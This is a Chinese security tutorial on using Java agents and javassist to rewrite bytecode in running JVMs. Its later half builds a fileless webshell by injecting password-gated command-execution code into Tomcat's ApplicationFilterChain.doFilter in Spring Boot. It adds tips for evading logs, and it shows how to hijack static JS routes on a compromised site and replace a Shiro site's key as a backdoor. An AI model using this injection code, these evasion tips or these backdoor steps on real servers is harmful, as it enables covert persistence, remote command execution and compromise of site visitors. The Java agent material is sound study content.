> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9450)

入门
--

### 介绍

<font color="red"> 注意：这里只是简短的介绍一下，想要详细了解，请看参考资料。</font>

> 在 JDK1.5 以后，javaagent 是一种能够在不影响正常编译的情况下，修改字节码。
> 
> java 作为一种强类型的语言，不通过编译就不能够进行 jar 包的生成。而有了 javaagent 技术，就可以在字节码这个层面对类和方法进行修改。同时，也可以把 javaagent 理解成一种代码注入的方式。但是这种注入比起 spring 的 aop 更加的优美。

Java agent 的使用方式有两种：

*   实现`premain`方法，在 JVM 启动前加载。
*   实现`agentmain`方法，在 JVM 启动后加载。

`premain`和`agentmain`函数声明如下，拥有`Instrumentation inst`参数的方法**优先级更高**：

```
public static void agentmain(String agentArgs, Instrumentation inst) {
    ...
}

public static void agentmain(String agentArgs) {
    ...
}

public static void premain(String agentArgs, Instrumentation inst) {
    ...
}

public static void premain(String agentArgs) {
    ...
}


```

第一个参数`String agentArgs`就是 Java agent 的参数。

第二个参数`Instrumentaion inst`相当重要，会在之后的进阶内容中提到。

### premain

要做一个简单的`premain`需要以下几个步骤：

1.  创建新项目，项目结构为：
    
    ```
    agent
    ├── agent.iml
    ├── pom.xml
    └── src
        ├── main
        │   ├── java
        │   └── resources
        └── test
            └── java
    
    ```
    
2.  创建一个类（这里为`com.shiroha.demo.PreDemo`），并且实现`premain`方法。
    
    ```
    package com.shiroha.demo;
    
    import java.lang.instrument.Instrumentation;
    
    public class PreDemo {
        public static void premain(String args, Instrumentation inst) throws Exception{
            for (int i = 0; i < 10; i++) {
                System.out.println("hello I`m premain agent!!!");
            }
        }
    }
    
    
    ```
    
3.  在`src/main/resources/`目录下创建`META-INF/MANIFEST.MF`，需要指定`Premain-Class`。
    
    ```
    Manifest-Version: 1.0
    Premain-Class: com.shiroha.demo.PreDemo
    
    
    ```
    
    要注意的是，**最后必须多一个换行**。
    
4.  打包成 jar
    
    选择`Project Structure` -> `Artifacts` -> `JAR` -> `From modules with dependencies`。
    
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111859-7c5a3b50-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111859-7c5a3b50-9e62-1.png)
    
    默认的配置就行。
    
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111859-7c81b400-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111859-7c81b400-9e62-1.png)
    
    选择`Build` -> `Build Artifacts` -> `Build`。
    
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111900-7cb3a460-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111900-7cb3a460-9e62-1.png)
    
    之后产生`out/artifacts/agent_jar/agent.jar`：
    
    ```
    └── out
        └── artifacts
            └── agent_jar
                └── agent.jar
    
    ```
    
5.  使用`-javaagent:agent.jar`参数执行`hello.jar`，结果如下。
    
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111900-7cf994a2-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111900-7cf994a2-9e62-1.png)
    
    可以发现在`hello.jar`输出`hello world`之前就执行了`com.shiroha.demo.PreDemo$premain`方法。
    

当使用这种方法的时候，整个流程大致如下图所示：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111900-7d22bb02-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111900-7d22bb02-9e62-1.png)

然而这种方法存在一定的局限性——**只能在启动时使用`-javaagent`参数指定**。在实际环境中，目标的 JVM 通常都是已经启动的状态，无法预先加载 premain。相比之下，agentmain 更加实用。

### agentmain

写一个`agentmain`和`premain`差不多，只需要在`META-INF/MANIFEST.MF`中加入`Agent-Class:`即可。

```
Manifest-Version: 1.0
Premain-Class: com.shiroha.demo.PreDemo
Agent-Class: com.shiroha.demo.AgentDemo


```

不同的是，这种方法不是通过 JVM 启动前的参数来指定的，官方为了实现启动后加载，提供了`Attach API`。Attach API 很简单，只有 2 个主要的类，都在 `com.sun.tools.attach` 包里面。着重关注的是`VitualMachine`这个类。

#### VirtualMachine

字面意义表示一个 Java 虚拟机，也就是程序需要监控的目标虚拟机，提供了获取系统信息、 `loadAgent`，`Attach` 和 `Detach` 等方法，可以实现的功能可以说非常之强大 。该类允许我们通过给 attach 方法传入一个 jvm 的 pid(进程 id)，远程连接到 jvm 上 。代理类注入操作只是它众多功能中的一个，通过`loadAgent`方法向 jvm 注册一个代理程序 agent，在该 agent 的代理程序中会得到一个`Instrumentation`实例。

具体的用法看一下官方给的例子大概就理解了：

```
// com.sun.tools.attach.VirtualMachine

// 下面的示例演示如何使用VirtualMachine:

        // attach to target VM
        VirtualMachine vm = VirtualMachine.attach("2177");  
        // start management agent
        Properties props = new Properties();
        props.put("com.sun.management.jmxremote.port", "5000");
        vm.startManagementAgent(props);
        // detach
        vm.detach();

// 在此示例中，我们附加到由进程标识符2177标识的Java虚拟机。然后，使用提供的参数在目标进程中启动JMX管理代理。最后，客户端从目标VM分离。


```

下面列几个这个类提供的方法：

```
public abstract class VirtualMachine {
    // 获得当前所有的JVM列表
    public static List<VirtualMachineDescriptor> list() { ... }

    // 根据pid连接到JVM
    public static VirtualMachine attach(String id) { ... }

    // 断开连接
    public abstract void detach() {}

    // 加载agent，agentmain方法靠的就是这个方法
    public void loadAgent(String agent) { ... }

}


```

根据提供的 api，可以写出一个`attacher`，代码如下：

```
import com.sun.tools.attach.AgentInitializationException;
import com.sun.tools.attach.AgentLoadException;
import com.sun.tools.attach.AttachNotSupportedException;
import com.sun.tools.attach.VirtualMachine;

import java.io.IOException;

public class AgentMain {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        String id = args[0];
        String jarName = args[1];

        System.out.println("id ==> " + id);
        System.out.println("jarName ==> " + jarName);

        VirtualMachine virtualMachine = VirtualMachine.attach(id);
        virtualMachine.loadAgent(jarName);
        virtualMachine.detach();

        System.out.println("ends");
    }
}


```

过程非常简单：通过 pid attach 到目标 JVM -> 加载 agent -> 解除连接。

现在来测试一下 agentmain：

```
package com.shiroha.demo;

import java.lang.instrument.Instrumentation;

public class AgentDemo {
    public static void agentmain(String agentArgs, Instrumentation inst) {
        for (int i = 0; i < 10; i++) {
            System.out.println("hello I`m agentMain!!!");
        }
    }
}


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111901-7d4211d2-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111901-7d4211d2-9e62-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111901-7d936154-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111901-7d936154-9e62-1.png)

成功 attach 并加载了 agent。

整个过程的流程图大致如下图所示：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111902-7deb2dbc-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111902-7deb2dbc-9e62-1.png)

进阶
--

### Instrumentation

`Instrumentation`是`JVMTIAgent`（JVM Tool Interface Agent）的一部分。Java agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。

下面列出这个类的一些方法，更加详细的介绍和方法，可以参照[官方文档](https://docs.oracle.com/javase/9/docs/api/java/lang/instrument/package-summary.html)。也可以看下面的[参考资料](#参考资料)。

```
public interface Instrumentation {

    // 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
    void addTransformer(ClassFileTransformer transformer);

    // 删除一个类转换器
    boolean removeTransformer(ClassFileTransformer transformer);

    // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;

    // 判断目标类是否能够修改。
    boolean isModifiableClass(Class<?> theClass);

    // 获取目标已经加载的类。
    @SuppressWarnings("rawtypes")
    Class[] getAllLoadedClasses();

    ......
}


```

由于知识点过多和篇幅限制，只先介绍`getAllLoadedClasses`和`isModifiableClasses`。

看名字都知道：

*   `getAllLoadedClasses`：获取所有已经加载的类。
*   `isModifiableClasses`：判断某个类是否能被修改。

修改之前写的 agentmain：

```
package com.shiroha.demo;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.instrument.Instrumentation;

public class AgentDemo {
    public static void agentmain(String agentArgs, Instrumentation inst) throws IOException {
        Class[] classes = inst.getAllLoadedClasses();
        FileOutputStream fileOutputStream = new FileOutputStream(new File("/tmp/classesInfo"));
        for (Class aClass : classes) {
            String result = "class ==> " + aClass.getName() + "\n\t" + "Modifiable ==> " + (inst.isModifiableClass(aClass) ? "true" : "false") + "\n";
            fileOutputStream.write(result.getBytes());
        }
        fileOutputStream.close();
    }
}


```

重新 attach 到某个 JVM，在`/tmp/classesInfo`文件中有如下信息：

```
class ==> java.lang.invoke.LambdaForm$MH/0x0000000800f06c40             
    Modifiable ==> false

class ==> java.lang.invoke.LambdaForm$DMH/0x0000000800f06840                
    Modifiable ==> false

class ==> java.lang.invoke.LambdaForm$DMH/0x0000000800f07440                
    Modifiable ==> false

class ==> java.lang.invoke.LambdaForm$DMH/0x0000000800f07040                
    Modifiable ==> false

class ==> jdk.internal.reflect.GeneratedConstructorAccessor29               
    Modifiable ==> true

........


```

得到了目标 JVM 上所有已经加载的类，并且知道了这些类能否被修改。

接下来来讲讲如何使用`addTransformer()`和`retransformClasses()`来篡改 Class 的字节码。

首先看一下这两个方法的声明：

```
public interface Instrumentation {

    // 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
    void addTransformer(ClassFileTransformer transformer);

    // 删除一个类转换器
    boolean removeTransformer(ClassFileTransformer transformer);

    // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;

    ......
}


```

在`addTransformer()`方法中，有一个参数`ClassFileTransformer transformer`。这个参数将帮助我们完成字节码的修改工作。

ClassFileTransformer
--------------------

这是一个接口，它提供了一个`transform`方法：

```
public interface ClassFileTransformer {
    default byte[]
    transform(  ClassLoader         loader,
                String              className,
                Class<?>            classBeingRedefined,
                ProtectionDomain    protectionDomain,
                byte[]              classfileBuffer) {
        ....
    }
}


```

这个接口的功能在注释中写道（经过翻译）：

```
// 代理使用addTransformer方法注册此接口的实现，以便在加载，重新定义或重新转换类时调用转换器的transform方法。该实现应覆盖此处定义的转换方法之一。在Java虚拟机定义类之前，将调用变压器。
// 有两种转换器，由Instrumentation.addTransformer（ClassFileTransformer，boolean）的canRetransform参数确定：
// 与canRetransform一起添加的具有重转换能力的转换器为true
// 与canRetransform一起添加为false或在Instrumentation.addTransformer（ClassFileTransformer）处添加的无法重新转换的转换器
// 在addTransformer中注册了转换器后，将为每个新的类定义和每个类重新定义调用该转换器。具有重转换功能的转换器也将在每个类的重转换上被调用。使用ClassLoader.defineClass或其本机等效项来请求新的类定义。使用Instrumentation.redefineClasses或其本机等效项进行类重新定义的请求。使用Instrumentation.retransformClasses或其本机等效项进行类重新转换的请求。在验证或应用类文件字节之前，将在处理请求期间调用转换器。如果有多个转换器，则通过链接转换调用来构成转换。也就是说，一次转换所返回的字节数组成为转换的输入（通过classfileBuffer参数）。


```

简单概括一下：

1.  使用`Instrumentation.addTransformer()`来加载一个转换器。
2.  转换器的返回结果（`transform()`方法的返回值）将成为转换后的字节码。
3.  对于没有加载的类，会使用`ClassLoader.defineClass()`定义它；对于已经加载的类，会使用`ClassLoader.redefineClasses()`重新定义，并配合`Instrumentation.retransformClasses`进行转换。

现在已经知道了怎样能修改 Class 的字节码，具体的做法还需要用到另一个工具——`javassist`。

javassist
---------

### javassist 简介

> Javassist (JAVA programming ASSISTant) 是在 Java 中编辑字节码的类库; 它使 Java 程序能够在运行时定义一个新类, 并在 JVM 加载时修改类文件。
> 
> 我们常用到的动态特性主要是反射，在运行时查找对象属性、方法，修改作用域，通过方法名称调用方法等。在线的应用不会频繁使用反射，因为反射的性能开销较大。其实还有一种和反射一样强大的特性，但是开销却很低，它就是 Javassit。
> 
> 与其他类似的字节码编辑器不同, Javassist 提供了两个级别的 API: 源级别和字节码级别。 如果用户使用源级 API, 他们可以编辑类文件, 而不知道 Java 字节码的规格。 整个 API 只用 Java 语言的词汇来设计。 您甚至可以以源文本的形式指定插入的字节码; Javassist 在运行中编译它。 另一方面, 字节码级 API 允许用户直接编辑类文件作为其他编辑器。

由于我们的目的只是修改某个类的某个方法，所以下面只介绍这一部分，更多的信息可以参考下面的[参考资料](#参考资料)。

### ClassPool

这个类是`javassist`的核心组件之一。

来看一下官方对他的介绍：

> `ClassPool`是`CtClass`对象的容器。`CtClass`对象必须从该对象获得。如果`get()`在此对象上调用，则它将搜索表示的各种源`ClassPath` 以查找类文件，然后创建一个`CtClass`表示该类文件的对象。创建的对象将返回给调用者。

简单来说，这就是个容器，存放的是`CtClass`对象。

获得方法： `ClassPool cp = ClassPool.getDefault();`。通过 `ClassPool.getDefault()` 获取的 `ClassPool` 使用 JVM 的类搜索路径。**如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类**，因为 Web 服务器使用多个类加载器作为系统类加载器。在这种情况下，**ClassPool 必须添加额外的类搜索路径**。

`cp.insertClassPath(new ClassClassPath(<Class>));`

### CtClass

可以把它理解成加强版的`Class`对象，需要从`ClassPool`中获得。

获得方法：`CtClass cc = cp.get(ClassName)`。

### CtMethod

同理，可以理解成加强版的`Method`对象。

获得方法：`CtMethod m = cc.getDeclaredMethod(MethodName)`。

这个类提供了一些方法，使我们可以便捷的修改方法体：

```
public final class CtMethod extends CtBehavior {
    // 主要的内容都在父类 CtBehavior 中
}

// 父类 CtBehavior
public abstract class CtBehavior extends CtMember {
    // 设置方法体
    public void setBody(String src);

    // 插入在方法体最前面
    public void insertBefore(String src);

    // 插入在方法体最后面
    public void insertAfter(String src);

    // 在方法体的某一行插入内容
    public int insertAt(int lineNum, String src);

}


```

传递给方法 `insertBefore()` ，`insertAfter()` 和 `insertAt()` 的 String 对象**是由`Javassist` 的编译器编译的**。 由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：

<table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td><code>$0</code>, <code>$1</code>, <code>$2</code>, ...</td><td><code>$0 = this; $1 = args[1] .....</code></td></tr><tr><td><code>$args</code></td><td>方法参数数组. 它的类型为 <code>Object[]</code></td></tr><tr><td><code>$$</code></td><td>所有实参。例如, <code>m($$)</code> 等价于 <code>m($1,$2,</code>...<code>)</code></td></tr><tr><td><code>$cflow(</code>...<code>)</code></td><td><code>cflow</code> 变量</td></tr><tr><td><code>$r</code></td><td>返回结果的类型，用于强制类型转换</td></tr><tr><td><code>$w</code></td><td>包装器类型，用于强制类型转换</td></tr><tr><td><code>$_</code></td><td>返回值</td></tr></tbody></table>

详细的内容可以看 [Javassist 使用指南（二）](https://www.jianshu.com/p/b9b3ff0e1bf8)。

### 示例

接下来使用一个小示例来更好的说明这个工具的用法。

目标程序 `hello.jar`，使用`Scanner`是为了在注入前不让程序结束：

```
// HelloWorld.java
public class HelloWorld {
    public static void main(String[] args) {
        hello h1 = new hello();
        h1.hello();
        // 输出当前进程的 pid
        System.out.println("pid ==> " + [pid])
        // 产生中断，等待注入
        Scanner sc = new Scanner(System.in);
        sc.nextInt();

        hello h2 = new hello();
        h2.hello();
        System.out.println("ends...");
    }
}

// hello.java
public class hello {
    public void hello() {
        System.out.println("hello world");
    }
}


```

Java agent `agent.jar`：

```
// AgentDemo.java
public class AgentDemo {
    public static void agentmain(String agentArgs, Instrumentation inst) throws IOException, UnmodifiableClassException {
        Class[] classes = inst.getAllLoadedClasses();
        // 判断类是否已经加载
        for (Class aClass : classes) {      
            if (aClass.getName().equals(TransformerDemo.editClassName)) { 
                // 添加 Transformer
                inst.addTransformer(new TransformerDemo(), true);
                // 触发 Transformer
                inst.retransformClasses(aClass);
            }
        }
    }
}

// TransformerDemo.java
// 如果在使用过程中找不到javassist包中的类，那么可以使用URLCLassLoader+反射的方式调用
public class TransformerDemo implements ClassFileTransformer {
    // 只需要修改这里就能修改别的函数
    public static final String editClassName = "com.xxxx.hello.hello";
    public static final String editClassName2 = editClassName.replace('.', '/');
    public static final String editMethod = "hello";

    @Override
    public byte[] transform(...) throws IllegalClassFormatException {
        try {
            ClassPool cp = ClassPool.getDefault();
            if (classBeingRedefined != null) {
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                cp.insertClassPath(ccp);
            }
            CtClass ctc = cp.get(editClassName);
            CtMethod method = ctc.getDeclaredMethod(editMethodName);
            String source = "{System.out.println(\"hello transformer\");}";
            method.setBody(source);
            byte[] bytes = ctc.toBytes();
            ctc.detach();
            return bytes;
        } catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}


```

这个示例比较通用，需要更改不同的方法时只需要改变常量和 source 变量即可。

来看看效果：（输入 1 之前使用了 Java agent）

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111902-7e052366-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111902-7e052366-9e62-1.png)

可以看到的是当第二次调用`com.xxx.hello.hello#hello()`的时候，输出的内容变成了`hello transformer`。

内存马
---

既然现在已经能够修改方法体了，那就可以将木马放到**某个一定会执行**的方法内，这样的话，当访问任意路由的时候，就会调用木马。那么现在的问题就变成了，注入到哪一个类的哪个方法比较好。

众所周知，Spring boot 中内嵌了一个`embed Tomcat`作为容器，而在网上流传着很多版本的 Tomcat“无文件” 内存马。这些内存马大多数都是通过**重写 / 添加`Filter`**来实现的。既然 Spring boot 使用了`Tomcat`，那么能不能照葫芦画瓢，通过`Filter`，实现一个 Spring boot 的内存马呢？当然是可以的。

### Spring Boot 的 Filter

对于一个 WebServer 来说，每次请求势必会进过大量的调用，一层一层读源码可不是一个好办法，至少不是一个快方法。这里我选择直接下断点调试。首先写一个 Spring Boot 的简单程序：

```
@Controller
public class helloController {

    @RequestMapping("/index")
    public String sayHello() {
        try {
            System.out.println("hello world");
        } catch (Exception e) {
            e.printStackTrace();
        } 
        return "index";
    }
}


```

直接在第 17 行下断点，开启 debug，并在网页端访问`http://127.0.0.1:8080/index`，触发断点。此时的调用栈如下图所示（由于太长，只截取一部分）：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111902-7e5c0f28-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111902-7e5c0f28-9e62-1.png)

在上图中，很明显的可以看到红框中存在很多的`doFilter`和`internalDoFilter`方法，他们大多来自于`ApplicationFilterChain`这个类。

来看看`ApplicationFilterChain`的`doFilter`方法：

```
@Override
public void doFilter(ServletRequest request, ServletResponse response)
    throws IOException, ServletException {

    if( Globals.IS_SECURITY_ENABLED ) {
        final ServletRequest req = request;
        final ServletResponse res = response;
        try {
            java.security.AccessController.doPrivileged(
                new java.security.PrivilegedExceptionAction<Void>() {
                    @Override
                    public Void run()
                        throws ServletException, IOException {
                        internalDoFilter(req,res);
                        return null;
                    }
                }
            );
        } catch (PrivilegedActionException pe) {
            ......
        }
    } else {
        internalDoFilter(request,response);
    }
}


```

乍一看内容挺多，其实总结下来就是——调用`this.internalDoFilter()`。所以再来简单看一下`internalDoFilter()`方法：

```
private void internalDoFilter(ServletRequest request,
                                  ServletResponse response)
        throws IOException, ServletException {

        // Call the next filter if there is one
        if (pos < n) {
            ......
        }
}


```

这两个个方法拥有`Request`和`Response`参数。如果能重写其中一个，那就能控制所有的请求和响应！因此，用来作为内存马的入口点简直完美。这里我选择`doFilter()`方法，具体原因会在之后提到。

### Java agent 修改 doFilter

只需要对上面的示例代码做一些变动即可。

1.  指定需要修改的类名和方法名：
    
    ```
    public static final String editClassName = "org.apache.catalina.core.ApplicationFilterChain";
    public static final String editClassName2 = editClassName.replace('.', '/');
    public static final String editMethod = "doFilter";
    
    
    ```
    
2.  为了不破坏程序原本的功能，这里不再使用`setBody()`方法，而是采用`insertBefore()`：
    
    ```
    method.insertBefore(source);
    
    
    ```
    
3.  出于方便考虑，实现一个`readSource()`方法，从文件中读取数据。：
    
    ```
    String source = this.readSource("start.txt");
    
    public static String readSource(String name) {
            String result = "";
            // result = name文件的内容
            return result;
        }
    
    
    ```
    
4.  在`start.txt`中，写入恶意代码：
    
    ```
    {
        javax.servlet.http.HttpServletRequest request = $1;
     javax.servlet.http.HttpServletResponse response = $2;
     request.setCharacterEncoding("UTF-8");
        String result = "";
        String password = request.getParameter("password");
        if (password != null) {
            // change the password here
            if (password.equals("xxxxxx")) { 
                String cmd = request.getParameter("cmd");
                if (cmd != null && cmd.length() > 0) {
                    // 执行命令，获取回显
             }
                response.getWriter().write(result);
                return;
            }
     }
    }
    
    
    ```
    

### 注入示例

注入之前，访问`http://127.0.0.1:8080/`：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111903-7e7e50a6-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111903-7e7e50a6-9e62-1.png)

注入 Java agent：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111903-7e9a42e8-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111903-7e9a42e8-9e62-1.png)

注入后，访问`http://127.0.0.1:8080/?password=xxx&exec=ls -al`：

可以看到已经成功的执行了 webshell。

当注入内存 shell 之后，http 的请求流程如下（简化版）：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111903-7ecd7b36-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111903-7ecd7b36-9e62-1.png)

到这儿，一个简单的 Java agent 内存马就制作完成。

### 注意事项

1.  <font color="red"> 由于某些中间件（例如 nginx）只记录 GET 请求，使用 POST 方式发送数据会更加隐蔽。</font>
    
2.  <font color="red"> 由于在 Filter 层过滤了 http 请求，访问任意的路由都可以执行恶意代码，为了隐蔽性不建议使用不存在的路由。</font>
    
3.  <font color="red">agent 可以注入多个，但是相同类名的 transformer 只能注入一个，所以要再次注入别的 agent 的时候记得更改一下类名。</font>
    
4.  <font color="red"> 这种内存马一旦注入到目标程序中，除了重启没有办法直接卸载掉，因为修改掉了原本的类的字节码。</font>
    
    既然如此，那我再把它改回去不就得了嘛。这就是我为什么选择`doFilter`方法的原因——逻辑简单，方便还原。它的逻辑只是调用了`internalDoFilter()`方法（简单来说）。还原就只需要`setBody()`即可：
    
    ```
    // source.txt
    {
        final javax.servlet.ServletRequest req = $1;
        final javax.servlet.ServletResponse res = $2;
        $0.internalDoFilter(req,res);
    }
    
    
    ```
    

拓展
--

当我们能够改变类的字节码，那能做的事情可多了去了，下面我提出两个例子，抛砖引玉。

### 路由劫持

再来假设这么一个情况：拿下来了站点 A，同时其他的资产暂时没有更大的收获，需要使用其他方法来扩展攻击面。在 A 的`/login`中使用了`/static/js/1.js`，那就可以劫持这个路由，回显给他恶意的 js 代码。

实现的话，只需要在`start.txt`也就是即将插入的代码块中，判断一下当前访问的路由。

```
String uri = request.getRequestURI();
if (uri.equals("/static/js/1.js")) {
    response.getWriter().write([恶意js代码]);
    return;
}


```

那么当访问到`/login`的时候，浏览器发现引用了外部 js——`/static/js/1.js`，就会去请求它，然而请求被我们修改后的`ApplicationFilterChain#doFilter()`拦截，返回了一个虚假的页面，导致资源被 “替换”，恶意代码发挥作用。

### 替换 shiro 的 key

shiro 的漏洞已经到了家喻户晓的地步，在实际的渗透中，看到 shiro 都会使用各种工具扫描一下。而后来 shiro 采用随机密钥之后，攻击难度就增加了。现在假设有这么一个情况：通过 shiro 反序列化得到了目标主机的权限，然后偷偷的改掉目标的 key，那么这个漏洞就只有你能够攻击，总某种意义上来说，帮人家修复了漏洞，也算是留了后门。

分析 shiro 反序列化漏洞的文章网上已经有很多了，这里就不再赘述，直接讲重点的地方。

**在解析 rememberMe 的时候，先将其 base64 解码，然后使用 AES 解密，在 AES 解密的时候，会调用`org.apache.shiro.mgt.AbstractRememberMeManager#getDecryptionCipherKey()`**，更改掉这个函数的返回值，就可以更改解密的密钥。实现也很简单，只需要改掉上面的常量和`start.txt`即可：

```
public static final String editClassName = "org.apache.catalina.core.ApplicationFilterChain";
public static final String editClassName2 = editClassName.replace('.', '/');
public static final String editMethod = "doFilter";

// start.txt (使用insertBefore())
{
    $0.setCipherKey(org.apache.shiro.codec.Base64.decode("4AvVhmFLUs0KTA3Kprsdag=="));
}

// start.txt (使用setBody())
{
    return (org.apache.shiro.codec.Base64.decode("4AvVhmFLUs0KTA3Kprsdag=="));
}


```

这里使用`vulhub/CVE-2016-4437`，演示一下效果：

注入前，使用`shiro_tool.jar`检验：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111903-7ee650fc-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111903-7ee650fc-9e62-1.png)

注入`shiroKey.jar`：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111903-7f021670-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111903-7f021670-9e62-1.png)

注入后，使用`shiro_tool.jar`检验：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210416111904-7f197ed2-9e62-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210416111904-7f197ed2-9e62-1.png)

可以看到 shiro 的 key 被成功更改。

参考资料
----

### Javassist

[Javaassist 简介](https://www.jianshu.com/p/334a148b420a)

[Javassist 使用指南（一）](https://www.jianshu.com/p/43424242846b)

[JVM 源码分析之 javaagent 原理完全解读](https://developer.aliyun.com/article/2946)

[javaagent 使用指南](https://www.cnblogs.com/rickiyang/p/11368932.html)

[Java Agent 基本简介和使用](https://www.jianshu.com/p/de6bde2e30a2)

### 内存马

[利用 intercetor 注入 spring 内存 webshell](https://landgrey.me/blog/19/)

[学 Springboot 必须要懂的内嵌式 Tomcat 启动与请求处理](https://www.jianshu.com/p/7dbaac902074)